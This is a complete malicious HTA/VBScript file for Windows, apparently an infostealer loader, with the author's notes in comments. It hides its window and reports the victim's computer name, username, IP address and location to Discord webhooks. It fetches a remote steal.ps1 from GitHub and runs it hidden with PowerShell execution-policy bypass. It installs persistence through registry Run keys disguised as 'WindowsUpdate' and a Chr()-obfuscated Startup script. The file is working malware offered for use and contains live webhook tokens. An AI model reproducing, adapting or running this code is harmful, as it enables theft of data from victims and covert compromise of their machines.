<!-- language: HTML/HTA, file: index.hta -->
<!-- target: Windows 10/11, mshta.exe -->
<!-- *skidded rogue Gist URL; strictly fetching lozix94-afk raw link*
     *two webhooks: WH_PRIMARY (first hit) / WH_LOG (re-grabs)*
     *upgraded red UI on all embeds* -->
<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no" windowstate="normal"/>
<script language="VBScript">
' --- FAST WHITE SCREEN FLASH (1.2s) ---
Dim sw, shh, fw, fh, fx, fy
Set sh = CreateObject("WScript.Shell")
sw  = screen.width
shh = screen.height
fw  = Int(sw  * 0.70)
fh  = Int(shh * 0.60)
fx  = Int((sw  - fw) / 2)
fy  = Int((shh - fh) / 2)
window.resizeTo fw, fh
window.moveTo fx, fy
SetTimeout "window.close()", 1200

On Error Resume Next

Dim fso, WH_PRIMARY, WH_LOG, PC, USER, STEAL_URL
Set fso = CreateObject("Scripting.FileSystemObject")

WH_PRIMARY = "https://discord.com/api/webhooks/1571738439324541049/t8ASDhr7mTWJmtIYue59Rz7MC2PnA45lV2kROoKmozZVxuhXGFUMUDDzVFJrJ4KxdlYu"
WH_LOG     = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
STEAL_URL  = "https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/steal.ps1"
PC         = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER       = sh.ExpandEnvironmentStrings("%USERNAME%")

Call PostEmbed(WH_PRIMARY, ":satellite: Session Start", "**PC:** ``" & PC & "`` | **User:** ``" & USER & "``", 16711680)

' --- First pass: PRIMARY ---
Call RunSteal(WH_PRIMARY)
Call IP(WH_PRIMARY)
Call Persistence

' --- Re-grabs: LOG ---
Dim attempt
For attempt = 2 To 3
    Call PostEmbed(WH_LOG, ":arrows_counterclockwise: Re-run steal.ps1 " & attempt & "/3", "**PC:** ``" & PC & "``", 16711680)
    Call SleepSeconds(120)
    Call RunSteal(WH_LOG)
    Call IP(WH_LOG)
Next

window.close()

Sub RunSteal(targetWH)
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", STEAL_URL, False
    xh.Send
    If xh.Status <> 200 Then
        Call PostEmbed(WH_LOG, ":warning: steal.ps1 fetch failed", "HTTP " & xh.Status & " :: " & STEAL_URL, 16711680)
        Exit Sub
    End If
    Dim body: body = xh.responseText
    If Len(body) < 200 Then
        Call PostEmbed(WH_LOG, ":warning: steal.ps1 too short", "Len " & Len(body), 16711680)
        Exit Sub
    End If
    Set xh = Nothing

    Dim psf: psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\steal.ps1"
    Dim f: Set f = fso.CreateTextFile(psf, True)
    f.Write body
    f.Close
    Set f = Nothing

    ' Pass the target webhook arg
    sh.Run "powershell -NoP -NonI -Exec Bypass -File """ & psf & """ -Webhook """ & targetWH & """", 0, True
    On Error Resume Next
    fso.DeleteFile psf, True
    On Error Goto 0
End Sub

Sub SleepSeconds(s)
    Dim w: Set w = CreateObject("WScript.Shell")
    w.Run "cmd /c timeout /t " & s & " /nobreak >nul", 0, True
    Set w = Nothing
End Sub

Sub IP(targetWH)
    Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip : ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll : ll = Split(xh.responseText, vbLf)
    Dim info : info = "**IP:** ``" & ip & "```n**Country:** ``" & ll(0) & "```n**Region:** ``" & ll(1) & "```n**City:** ``" & ll(2) & "```n**ISP:** ``" & ll(3) & "```n**PC:** ``" & PC & "`` | **User:** ``" & USER & "``"
    Call PostEmbed(targetWH, ":dart: Target Info", info, 16711680)
    Set xh = Nothing
End Sub

Sub Persistence()
    Dim payload : payload = "mshta https://raw.githubusercontent.com/lozix94-afk/lozix-ivesawadawa/refs/heads/main/index.hta"
    On Error Resume Next
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate", payload, "REG_SZ"
    sh.RegWrite "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\WinUpdate", payload, "REG_SZ"
    Dim sp : sp = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Microsoft\Windows\Start Menu\Programs\Startup\winupdate.vbs"
    Dim sf : Set sf = fso.CreateTextFile(sp, True)
    sf.WriteLine "CreateObject(Chr(87)&Chr(83)&Chr(99)&Chr(114)&Chr(105)&Chr(112)&Chr(116)&Chr(46)&Chr(83)&Chr(104)&Chr(101)&Chr(108)&Chr(108)).Run Chr(34)&""" & payload & """&Chr(34), 0, False"
    sf.Close
    Call PostEmbed(WH_PRIMARY, ":pushpin: Persistence", "**3 startup methods installed**`n🔴 HKCU Run`n🔴 HKCU RunOnce`n🔴 Startup Folder", 16711680)
End Sub

Sub PostEmbed(targetWH, t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[{" & DQ & "title" & DQ & ":" & DQ & Ej(t) & DQ & "," & DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & DQ & "color" & DQ & ":" & c & "}]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", targetWH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
End Sub

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr,  Chr(92) & "n")
    Ej = Replace(Ej, vbLf,  Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</head><body></body></html>
